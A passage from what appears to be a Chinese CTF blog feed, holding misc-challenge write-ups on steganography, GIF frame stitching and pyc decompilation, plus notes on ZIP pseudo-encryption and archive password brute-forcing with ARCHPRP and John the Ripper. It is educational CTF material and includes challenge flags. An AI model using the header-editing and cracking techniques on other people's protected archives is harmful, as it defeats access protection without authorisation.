class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得轨迹：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CatCTF-CatchCat4.png" alt="CatCTF-CatchCat4.png"></p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>CatCTF{GPS_M1ao}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】glance-50</title>
      <link href="/posts/cb17d40d.html"/>
      <url>/posts/cb17d40d.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉 <mark>gif 图片的拆分和拼接</mark></p></li><li><p><mark>拆分网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a> 可以直接将帧拼接起来，方便直接看到每一帧拼接起来的原图</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/9266eadf353d4ada94ededaeb96d0c50.gif">【攻防世界】glance-50</a></p><hr><h1 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h1><p>得到一张 gif 动态图片：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-glance-50%201.png" alt="攻防世界-glance-50 1.png"></p><p>由于图画很窄，尝试修改宽度无果，在 Ubuntu 中隐写分析也没有发现</p><p>根据以往经验，gif 大概率是需要拆分的，于是将 gif 文件拆分成帧图片：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-glance-50%202.png" alt="攻防世界-glance-50 2.png"></p><p>使用这个网站可以直接将拆分后的图片集中展示出来，可以直接得到 flag</p><p>这个题其实就是将藏有 flag 的图片拆分为一段一段的，然后将每一个片段作为一帧合成 gif 动态图。所以直接将 gif 拆分为帧后，再拼接起来即可</p><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>使用网站分离得到帧图片：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-glance-50%203.png" alt="攻防世界-glance-50 3.png"></p><p>在 Win 下安装 <code>ImageMagick</code> ：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a></p><p>在帧图片文件夹下打开 cmd，执行 <code>magick montage *.png -tile 201x1 -geometry +0+0 flag.png</code> </p><p>得到一张拼接的图片 flag.png：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-glance-50%204.png" alt="攻防世界-glance-50 4.png"></p><p>根据图片内容获得 flag</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>TWCTF{Bliss by Charles O’Rear}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】hit-the-core</title>
      <link href="/posts/aa952649.html"/>
      <url>/posts/aa952649.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><mark>给出形式很像 flag 的字符串时，注意观察大写、小写、数字、符号之间有没有什么规律</mark></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8deb5f0c2cd84143807b6175f58d6f3f.core">【攻防世界】hit-the-core</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下载得到一个 .core 文件，但用 exeinfo PE 查看发现是 64位 elf 可执行文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hit-the-core1.png" alt="攻防世界-hit-the-core1.png"></p><p>在 ubuntu 下执行失败：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hit-the-core2.png" alt="攻防世界-hit-the-core2.png"></p><p>在 IDA 中查看发现一串字符：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hit-the-core3.png" alt="攻防世界-hit-the-core3.png"></p><p>格式很像 flag，但尝试后发现不对：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>发现这段 flag 很有规律，如果每 5 位看成一组，在每组的第 4 位就有一个大写字母，而其他的都是小写</strong></em></p><p><em><strong>尝试将每 5 组的第 4 位提取出来：</strong></em></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ALEXCTF&#123;K33P_7H3_g00D_w0rk_up&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试后发现获得 flag</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>ALEXCTF{K33P_7H3_g00D_w0rk_up}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】misc_pic_again</title>
      <link href="/posts/97279582.html"/>
      <url>/posts/97279582.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>熟悉 LSB 隐写</mark>，<mark>熟悉 zsteg 的相关分析结果的意思以及提取指令</mark></p></li><li><p><mark>熟悉 Stegsolve 的使用</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/719af25af2ca4707972c6ae57060238e.png">【攻防世界】misc_pic_again</a></p><hr><h1 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h1><p>解压得到一张图片，图片没有异常：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again1.png" alt="攻防世界-misc_pic_again1.png"></p><p>在 kali 下用 <code>zsteg</code> 分析图片：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again2.png" alt="攻防世界-misc_pic_again2.png"></p><p>发现分析结果中藏有 Zip 文件</p><p>提取 Zip 文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again3.png" alt="攻防世界-misc_pic_again3.png"></p><p>解压 1.zip 后得到一个可执行文件 1</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again4.png" alt="攻防世界-misc_pic_again4.png"></p><p>增加执行权限 <code>chmod a+x 1</code> 后，执行该文件，错误：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again5.png" alt="攻防世界-misc_pic_again5.png"></p><p>查看文件 1 的字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again6.png" alt="攻防世界-misc_pic_again6.png"></p><p>得到 flag</p><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>利用 Stegsolve 打开：<code>java -jar Stegsolve.jar</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again7.png" alt="攻防世界-misc_pic_again7.png"></p><p>用 LSB 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again8.png" alt="攻防世界-misc_pic_again8.png"></p><p>输入参数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again9.png" alt="攻防世界-misc_pic_again9.png"></p><p>根据十六进制数据发现 <code>PK</code>，该文件是一个 <code>zip</code> 压缩包，直接将文件另存为 1.zip：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again10.png" alt="攻防世界-misc_pic_again10.png"></p><p>解压后得到一个 elf 可执行文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again11.png" alt="攻防世界-misc_pic_again11.png"></p><p>后续同思路一，在 linux 下 <code>strings 1</code> 得到 flag</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>hctf{scxdc3tok3yb0ard4g41n~~~}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】适合作为桌面</title>
      <link href="/posts/a2e9e881.html"/>
      <url>/posts/a2e9e881.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>得到文件的十六进制数据时，可以将该十六进制数据粘贴进 WinHex 后另存为一个新的文件</mark>，就可以得到该十六进制数据对应的文件，注意文件后缀名</p></li><li><p><mark>留意 pyc、pyt 等，一般与 python 反编译有关</mark>，在线 pyc 反编译：<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1573d940d9bb47a083da6db70ffbffe0.rar">【攻防世界】适合作为桌面</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压得到一张 png 图片</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A21.png" alt="攻防世界-适合作为桌面1.png"></p><p>用 <code>Stegsolve</code> 打开：<code>java -jar Stegsolve.jar</code></p><p>通过调整颜色发现一个二维码</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A22.png" alt="攻防世界-适合作为桌面2.png"></p><p>扫码得到一串字符：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txtspan aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现该字符都是由数字和字母 ABCDEF 组成的，由此猜测这是十六进制</p><p>进行十六进制转字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A23.png" alt="攻防世界-适合作为桌面3.png"></p><p>有很多乱码，但是可以看到有不少 <code>&#39;&#123;&#125;&#39;</code>、<code>&#39;()&#39;</code>，感觉像是代码</p><p>结合可以看到 <code>1.pyt</code>、<code>1.pyR</code>，可能与 python 的反编译文件有关<mark>（由文件头 03 F3 也可推断是 pyc 文件）</mark></p><p><mark>将这一串十六进制数据，用 WinHex 粘贴进去：</mark></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A24.png" alt="攻防世界-适合作为桌面4.png"></p><p><mark>并另存为一个新的文件，后缀名改为 .pyc，得到 1.pyc：</mark></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A25.png" alt="攻防世界-适合作为桌面5.png"></p><p>通过在线 pyc 反编译该文件：<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A26.png" alt="攻防世界-适合作为桌面6.png"></p><p>反编译成功，得到代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit https://tool.lu/pyc/ for more information</span><span class="token comment"># Version: Python 2.7</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">102</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">103</span><span class="token punctuation">,</span>        <span class="token number">123</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">50</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">49</span><span class="token punctuation">,</span>        <span class="token number">101</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">125</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现是一段打印 flag 的代码，稍作修改，直接运行即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%82%E5%90%88%E4%BD%9C%E4%B8%BA%E6%A1%8C%E9%9D%A27.png" alt="攻防世界-适合作为桌面7.png"></p><p>得到 flag</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{38a57032085441e7}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIF图片的拆分和拼图</title>
      <link href="/posts/aa5536c1.html"/>
      <url>/posts/aa5536c1.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-平台"><a href="#Windows-平台" class="headerlink" title="Windows 平台"></a>Windows 平台</h1><h2 id="拆分并拼图"><a href="#拆分并拼图" class="headerlink" title="拆分并拼图"></a>拆分并拼图</h2><blockquote><p>将 GIF 拆分成一帧一帧的片段，并直接将这些片段拼起来在网站上展示一整张图</p></blockquote><ul><li>在线网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a></li></ul><hr><h2 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h2><blockquote><p>将 GIF 拆分成一帧一帧的单独文件，可打包下载到本地，但没有拼图的功能</p></blockquote><ul><li>在线网站：<a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a></li></ul><hr><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><blockquote><p>配合 <a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a> 使用，先将 GIF 拆分成一个个文件，并置于同一文件夹内，然后使用 ImageMagick 进行拼接</p></blockquote><ul><li>下载：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a></li><li>使用：<ol><li>到需要拼接的图片目录下，调用 <code>cmd</code></li><li>执行命令：<code>magick montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code> </li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr><h1 id="Linux-平台"><a href="#Linux-平台" class="headerlink" title="Linux 平台"></a>Linux 平台</h1><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><blockquote><p>在 Linux 下，convert 是一款基于 ImageMagick 软件的命令行工具，用于进行图像格式转换、大小调整、旋转、剪切、添加边框、改变图像色彩等操作</p></blockquote><ul><li>使用：<br>  <code>convert gif文件名 输出路径/flag.png</code></li></ul><hr><h2 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h2><blockquote><p>在 Linux 下，montage 是基于 ImageMagick 工具集的一个命令行工具，用于将多张图片合成为一张大图</p></blockquote><ul><li>下载安装：<br>  <code>sudo apt-get install graphicsmagick-imagemagick-compat</code></li><li>使用：<ol><li>到需要拼接的图片目录下，打开终端</li><li>执行命令：<br> <code>montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code></li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP伪加密</title>
      <link href="/posts/ce09e570.html"/>
      <url>/posts/ce09e570.html</url>
      
        <content type="html"><![CDATA[<h1 id="ZIP-伪加密原理"><a href="#ZIP-伪加密原理" class="headerlink" title="ZIP 伪加密原理"></a>ZIP 伪加密原理</h1><blockquote><p>zip 伪加密是在文件头的加密标志位做修改，进而再打开文件时被识别为加密压缩包</p></blockquote><hr><h1 id="自动化识别工具"><a href="#自动化识别工具" class="headerlink" title="自动化识别工具"></a>自动化识别工具</h1><h2 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h2><blockquote><p>ZipCenOp 是一个 jar 包，用于操作 zip 格式的压缩文件，还支持对 zip 文件进行密码保护，也可以用于识别 zip 文件是否是伪加密</p><p>下载安装：<a href="https://github.com/442048209as/ZipCenOp/releases/tag/1.0">Release 1.0 · 442048209as&#x2F;ZipCenOp</a></p></blockquote><p>使用：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ZipCenOp.jar r zip文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功后会输出：“success 1 flag(s) found”</p><p>然后直接解压伪加密的压缩包即可</p><hr><h2 id="WinRAR"><a href="#WinRAR" class="headerlink" title="WinRAR"></a>WinRAR</h2><blockquote><p>一个解压软件，随缘吧，不一定行</p></blockquote><p>进入 “工具”，修复压缩文件</p><hr><h1 id="ZIP-文件的结构"><a href="#ZIP-文件的结构" class="headerlink" title="ZIP 文件的结构"></a>ZIP 文件的结构</h1><blockquote><p>一个 ZIP 文件由三个部分组成：数据区、目录区、目录结束标志</p></blockquote><p><strong>注意</strong>：在使用 010 Editor 修改十六进制数据时，直接将光标移动到要修改的位置，然后直接输入十六进制数据就会自动覆盖当前数据</p><p><mark>如果先使用删除键再输入数据，务必检查十六进制数据的数量是否正确，以免误删</mark></p><hr><h2 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h2><blockquote><p>判断是否加密的数据为 50 4B 03 04 之后的<em>第 3 字节和第 4 字节</em></p></blockquote><table><thead><tr><th align="left">数据</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>50 4B 03 04</strong></td><td align="left">文件头标记</td></tr><tr><td align="left">14 00</td><td align="left">解压文件所需 pkware 版本</td></tr><tr><td align="left"><mark>09 00</mark></td><td align="left">全局方式位标记（<mark>表示有无加密，奇数加密，偶数未加密</mark>）</td></tr><tr><td align="left">08 00</td><td align="left">压缩方式</td></tr><tr><td align="left">50 A3</td><td align="left">最后修改文件时间</td></tr><tr><td align="left">A5 4A</td><td align="left">最后修改文件日期</td></tr><tr><td align="left">21 38 76 64</td><td align="left">CRC32 校验</td></tr><tr><td align="left">19 00 00 00</td><td align="left">压缩后尺寸（25）</td></tr><tr><td align="left">17 00 00 00</td><td align="left">未压缩尺寸（23）</td></tr><tr><td align="left">08 00</td><td align="left">文件名长度</td></tr><tr><td align="left">00 00</td><td align="left">扩展记录长度</td></tr></tbody></table><hr><h2 id="目录区"><a href="#目录区" class="headerlink" title="目录区"></a>目录区</h2><blockquote><p>判断是否加密的数据为 50 4B 01 02 之后的<em>第 5 字节和第 6 字节</em></p></blockquote><table><thead><tr><th align="left">数据</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>50 4B 01 02</strong></td><td align="left">目录区文件头标记</td></tr><tr><td align="left">1F 00</td><td align="left">压缩使用的 pkware 版本</td></tr><tr><td align="left">14 00</td><td align="left">解压文件所需 pkware 版本</td></tr><tr><td align="left"><mark>09 00</mark></td><td align="left">全局方式位标记（表示有无加密，同数据区，<mark>伪加密修改这里</mark>）</td></tr><tr><td align="left">08 00</td><td align="left">压缩方式&amp;nbsp;&amp;nbsp;</td></tr><tr><td align="left">50 A3</td><td align="left">最后修改文件时间</td></tr><tr><td align="left">A5 4A</td><td align="left">最后修改文件日期</td></tr><tr><td align="left">21 38 76 65</td><td align="left">CRC32 校验</td></tr><tr><td align="left">19 00 00 00</td><td align="left">压缩后尺寸（25）</td></tr><tr><td align="left">17 00 00 00</td><td align="left">未压缩尺寸（23）</td></tr><tr><td align="left">08 00</td><td align="left">文件名长度</td></tr><tr><td align="left">24 00</td><td align="left">扩展字段长度</td></tr><tr><td align="left">00 00</td><td align="left">文件注释长度</td></tr><tr><td align="left">00 00</td><td align="left">磁盘开始号</td></tr><tr><td align="left">00 00</td><td align="left">内部文件属性</td></tr><tr><td align="left">20 00 00 00</td><td align="left">外部文件属性</td></tr><tr><td align="left">00 00 00 00</td><td align="left">局部头部偏移量</td></tr></tbody></table><hr><h2 id="目录结束标志"><a href="#目录结束标志" class="headerlink" title="目录结束标志"></a>目录结束标志</h2><table><thead><tr><th align="left">数据</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>50 4B 05 06</strong></td><td align="left">目录结束标记</td></tr><tr><td align="left">00 00</td><td align="left">当前磁盘编号</td></tr><tr><td align="left">00 00</td><td align="left">目录区开始磁盘编号</td></tr><tr><td align="left">01 00</td><td align="left">本磁盘上记录总数</td></tr><tr><td align="left">01 00</td><td align="left">目录区中记录总数</td></tr><tr><td align="left">5A 00 00 00</td><td align="left">目录区尺寸大小</td></tr><tr><td align="left">3F 00 00 00</td><td align="left">目录区对第一张磁盘的偏移量</td></tr><tr><td align="left">00 00 00</td><td align="left">ZIP 文件注释长度</td></tr></tbody></table><hr><h1 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h1><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>00 00</td></tr></tbody></table><hr><h1 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h1><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h1 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h1><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>09 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h1 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h1><table><thead><tr><th>加解密</th><th>方法</th></tr></thead><tbody><tr><td>去除密码</td><td><strong>目录区 的 全局方式位标记</strong> 的 <em>01 00 或 09 00</em> 改为 <em>00 00</em></td></tr><tr><td>添加密码提示</td><td><strong>目录区 的 全局方式位标记</strong> 的 <em>00 00</em> 改为 <em>01 00 或 09 00</em></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>压缩包密码爆破</title>
      <link href="/posts/d36e35d8.html"/>
      <url>/posts/d36e35d8.html</url>
      
        <content type="html"><![CDATA[<h1 id="ARCHPRP"><a href="#ARCHPRP" class="headerlink" title="ARCHPRP"></a>ARCHPRP</h1><blockquote><p>Windows 下的一款压缩包密码爆破工具，全名为 Advanced Archive Password Recovery Professional</p><p>下载地址：<a href="https://www.52pojie.cn/thread-1691394-1-1.html">Advanced Archive Password Recovery 4.54-压缩包破解工具 - 『精品软件区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p></blockquote><ol><li>如果只知道密码是某些字符、数字的组合，可以使用暴力破解</li></ol><p>例如：暴力范围选择所有数字，长度为 1 ~ 6，则从 1 开始一直尝试到 999999</p><p>首先将攻击类型选择为暴力，确定暴力范围</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-ARCHPRP1.png" alt="压缩包密码爆破-ARCHPRP1.png"></p><p>然后确定爆破的密码长度</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-ARCHPRP2.png" alt="压缩包密码爆破-ARCHPRP2.png"></p><p>点击开始，等待爆破完成即可  </p><ol start="2"><li>如果知道密码的某些位，但其他位不知道，可以使用掩码模式</li></ol><p>例如：已知密码的正则表达式为 <code>ChunQiu\d&#123;4&#125;</code>，意思是密码的前七位为 <code>ChunQiu</code>，后四位为 0 ~ 9 之间的数字，总共 11 位</p><p>首先将攻击类型选择为掩码，在掩码一栏中输入：<code>ChunQiu????</code>，这里的 <code>?</code> 就是需要爆破的位置</p><p>将暴力范围选择为所有数字</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-ARCHPRP3.png" alt="压缩包密码爆破-ARCHPRP3.png"></p><p>点击开始，等待爆破完成即可</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-ARCHPRP4.png" alt="压缩包密码爆破-ARCHPRP4.png"></p><hr><h1 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h1><blockquote><p>一款常用的密码破解工具，可以用于暴力破解各种类型的加密密码</p></blockquote><p>下载安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> john<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用步骤：</p><ol><li><p>准备哈希文件<br> 使用 